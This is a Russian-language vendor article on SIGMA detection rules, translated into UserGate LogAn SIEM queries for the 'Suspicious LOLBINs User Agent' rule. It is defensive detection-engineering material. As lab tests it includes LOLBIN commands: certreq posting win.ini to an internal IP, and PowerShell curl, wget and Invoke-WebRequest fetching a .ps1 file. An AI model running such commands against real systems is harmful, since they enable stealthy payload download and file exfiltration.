---
заголовок: Применение SIGMA-правила «Suspicious LOLBINs User Agent» на UserGate LogАn
url: https://usergate.com/security-reports/sigma-rules-6253/
источник: основной сайт
получено: 2026-11-20 17:35 +0700
раздел: Новости
крошки: uFactor / Новости
---

# Применение SIGMA-правила «Suspicious LOLBINs User Agent» на UserGate LogАn

21.02.2022
SIGMA — это унифицированный формат описания правил детектирования событий. Существует большая накопленная сообществом экспертиза, хранящаяся в виде SIGMA-правил. В статье рассмотрим пример, который поможет вам при создании правил корреляции для LogAn на основе SIGMA.
В этой статье вы узнаете:
о процессе обнаружения инцидентов;
написании SIGMA-правил с примерами;
о том, чем опасны LOLBINs и какой ущерб они могут нанести сети;
соответствующих настройках UserGate LogAn v. 6.2.
SIGMA-правила для SIEM
SIEM (Security Information and Event Management, Система сбора, анализа и корреляции событий) — система управления информацией о безопасности и событиями информационной безопасности.
Сейчас мы кратко рассмотрим, как происходит обнаружение инцидентов ИБ.
SIEM используют определенные правила, с помощью которых определяется вредоносная активность. Эти правила отслеживают события в контролируемых системах. Например, при частом возникновении Event ID = 4625 (отказ входа в систему) считается, что происходит brute-force атака на систему. И таких правил может быть множество: правило, обнаруживающее очистку логов; правило, обнаруживающее запуск cmd.exe макросами и т.д.
В том, чтобы извлечь события ИБ, сложности нет. А вот с написанием правил есть несколько проблем, так как для этого принято использовать специальный язык запросов определенной SIEM.
Тем не менее, существуют определенные стандарты написания таких правил. SIGMA — язык описания правил обнаружения инцидентов для SIEM. SIGMA-правила представляют собой YAML-документы, которые описывают сценарии выявления вредоносной активности. Данные правила состоят из блоков:
Описание правила;
Описание источников данных;
Описание условий срабатывания.
Ниже представлен пример SIGMA-правила, выявляющего очистку логов Windows:
title: Security Eventlog Cleared                                 # описание правила
id: f2f01843-e7b8-4f95-a35a-d23584476423                         # идентификатор правила
description: Some threat groups tend to delete the local 'Security' Eventlog using certain utitlities     # описание детекта
tags:                                                            # тег правила
- attack.defense_evasion                                         # тактика MITRE ATT&CK
- attack.t1070                                                   # техника MITRE ATT&CK
- car.2016-04-002                                                # аналитика
author: Florian Roth
date: 2017/02/19
logsource:                                                       # источник обнаружения
product: windows                                                 # продукт
service: security                                                # сервис получения событий
detection:                                                       # процесс обнаружения
selection:
EventID:
- 517
- 1102
condition: selection
falsepositives:
- Rollout of log collection agents (the setup routine often includes a reset of the local Eventlog)
- System provisioning (system reset before the golden image creation)
level: high
Преимуществом SIGMA является общедоступность проекта. Это значит, что любой пользователь может скачать базу правил и использовать ее для своих систем.
Правила обнаружения тактики LOLBINs
А что насчет более сложных атак?
LOLBINs или Living off the Land — это тактика использования легитимных программ для обхода средств защиты. Примерами таких программ могут выступать PowerShell, bash, psexec, certutil, и др.
Примеры атак с использованием LOLBINs:
Загрузка и выполнение вредоносного кода;
Обход UAC.
LOLBINs опасны тем, что для выполнения вредоносной активности используются разрешенные программы.
Процесс обнаружения таких атак основан на анализе событий и их корреляции. О том, как обнаружить факт использования LOLBINs с помощью UserGate Log Analyzer v. 6.2, расскажем ниже.
Рассмотрим случай написания правила аналитики в продукте UserGate LogАn для обнаружения использования нестандартных методов скачивания вредоносного ПО на компьютеры жертвы. За основу возьмем SIGMA-правило, созданное сообществом на основе публичных материалов:
title: Syspicious LOLBINs User Agent                    # описание правила
id: 04427190-98d6-4bba-a0fb-5db3b73ec245                # уникальный идентификатор
description: Detect suspicious usage of LOLBIN tools    # описание правила
date: 2021/04/05                                        # дата создания правила
modified: 2021/04/05                                    # дата последнего изменения
references:                                             # список источников
- https://lolbas-project.github.io/lolbas/Binaries/Certreq/
- https://lolbas-project.github.io/lolbas/Binaries/Certutil/
- https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
- https://lolbas-project.github.io/lolbas/Binaries/Msiexec
tags:                                                   # тег правила
- attack.comand_and_control                           # тактика MITRE ATT&CK
- attack.t1105                                        # техника MITRE ATT&CK
logsource:                                              # источник журнала
category: webserver                                   # категория журнала
detection:                                              # процесс обнаружения
certreq_ua:                                           # скачивание ПО с помощью certreq
c-useragent|startswith:
- 'Mozilla/4.0 (compatible; Win32; NDES client')
powershell_iwr_ua:                                    # скачивание ПО с помощью PowerShell
c-useragent|contains|all:
- 'Mozilla/'
- 'WindowsPowerShell/'
powershell_iwr_whitelists:
- c-uri:
- '/adfs/probe'
- curl|endswith:
- '.crl'
certutil_ua:                                          # скачивание ПО с помощью certutil
c-useragent|startswith:
- 'Microsoft-CryptoAPI/'
certutil_whitelist:
- cs-host|startswith:
- 'ocsp.'
- cs-host:
- 'ctldl.windowsupdate.com'
- cs(Content-Type):
- 'application/pkix-cert'
- 'application/pkix-crl'
- 'application/pkcs7-mime'
- 'application/ocsp-response'
- 'application/timestamp-reply'
- c-uri|endswith:
- '.crl'
- '.crt'
- '.p7c'
regsvr32_ua:                                          # скачивание ПО с помощью regsvr32
c-useragent|startswith:
- 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E'
regsvr32_whitelist:
c-useragent|contains:
- 'MSOffice'
msiexec_ua:                                           # скачивание ПО с помощью msiexec
c-useragent:
- "Windows Installer"
condition: certreq_ua or (powershell_iwr_ua and not powershell_iwr_whitelists) or (certutil_ua and not certutil_whitelist) or (regsvr32_ua and not regsvr32_whitelist) or msiexec_ua
fields:                                                 # оценка события
- c-uri
- client_ip
- fields
falsepositives:
- certutil.exe can upload other types of crypto files, in that case, the need to be added to the whitelist.
- Powershell iwr commandlet can later be used for other internal windows tasks.
level: medium
Подробности по настройке UserGate LogAn изложены в
документации к продукту
. Мы рассмотрим частный случай написания правила аналитики.
В SIGMA-правиле в качестве источника используется лог веб-сервера. В LogAn будем использовать раздел «Analytics search», где в качестве источника выбираем «webaccess log»:
Опишем первое условие поиска «certreq_ua»:
(userAgent ~ 'Mozilla/4.0 (compatible; Win32; NDES client')
Для тестирования воспользуемся
описанным в примере
способом. На стенде выполним следующую команду:
certreq -Post -config http://192.168.44.57/file.ps1 c:\windows\win.ini file.ps1
Через интерфейс LogAn выполним поиск с помощью нашего условия:
Найдено 2 записи.
Далее опишем правило поиска UserAgent (powershell_iwr_ua), который используется Powershell по умолчанию, при этом необходимо исключить легитимные запросы (powershell_iwr_whitelists):
(userAgent ~ 'Mozilla/' and userAgent ~ 'WindowsPowerShell/') AND (url !~ '/adfs/probe' and url NOT MATCH '\.crl$')
В соответствии с полем «condition», объединим эти 2 условия:
(userAgent ~ 'Mozilla/4.0 (compatible; Win32; NDES client') OR ((userAgent ~ 'Mozilla/' and userAgent ~ 'WindowsPowerShell/') AND (url !~ '/adfs/probe' and url NOT MATCH '\.crl$'))
Для надежности рекомендуется тестировать каждое правило в отдельности, а потом объединять их, усложняя запрос. Для тестирования 2-го правила на стенде выполним команды, которые используют один механизм Powershell:
Powershell.exe –c curl http://192.168.44.57/file.ps1 -Outfile file4.ps1
Powershell.exe –c wget http://192.168.44.57/file.ps1 -Outfile file5.ps1
Powershell.exe -Command Invoke-WebRequest -Uri http://192.168.44.57/file.ps1 -Outfile file6.ps1
Выполним запрос с нашим фильтром и получим следующий результат.
Для просмотра записей переключимся на текстовый режим просмотра:
В результате мы нашли запросы, сделанные с помощью утилиты certreq и powershell, с учетом исключения легитимных запросов.
Далее по аналогии описываем следующие поля Sigma-правила. В результате получим следующий запрос в LogAn:
source = 'webaccess log' and (userAgent ~ 'Mozilla/4.0 (compatible; Win32; NDES client') OR ((userAgent ~ 'Mozilla/' and userAgent ~ 'WindowsPowerShell/') AND (url !~ '/adfs/probe' and url NOT MATCH '\.crl$')) OR ((userAgent MATCH '^Microsoft-CryptoAPI/') and (url NOT MATCH '^http?://ocsp\.' and url !~ 'ctldl.windowsupdate.com' and url !~ "www.download.windowsupdate.com" and mime != 'application/pkix-cert' and mime != 'application/pkix-crl' and mime != 'application/pkcs7-mime' and mime != 'application/ocsp-response' and mime != 'application/timestamp-reply' and url NOT MATCH '\.crl$' and url NOT MATCH '\.crt$' and url NOT MATCH '\.p7c$')) OR ((userAgent ~ 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E') AND (userAgent !~ 'Office' and url !~ 'oneclient.sfx.ms' and url !~ 'live.com')) OR (userAgent = 'Windows Installer')
В результате получим все подозрительные запросы, которые попадают под Sigma-правило:
Теперь можно создать правило аналитики для детектирования.
Необходимо создать правило:
Создать условие, в котором задать фильтр:
Работу правила можно проверить в «ретроспективном режиме» на уже имеющихся событиях:
После активации правило начнет работать в режиме реального времени, а результат его работы можно будет увидеть во вкладке «Triggered alerts»:
При клике на «Triggered alert ID» попадаем в детали события, где можно просмотреть подробности:
Таким образом, мы реализовали Sigma-правило, созданное для детектирования определенной подозрительной активности.
Вывод
Проект SIGMA помогает аналитикам SOC обмениваться знаниями и помогать сообществу по ИБ бороться с возникающими угрозами. Хотя сами правила являются несложными по синтаксису, они служат верным инструментом по выявлению инцидентов в SIEM-системах.
Авторы статьи:
Максим Подобаев, Никита Бекетов, Центр мониторинга и реагирования UserGate,
Дмитрий Лебедев, инженер
TS Solution
За дополнительной информацией обращайтесь к нашим специалистам:
ufactor@usergate.com

## �?сточник

https://usergate.com/security-reports/sigma-rules-6253/
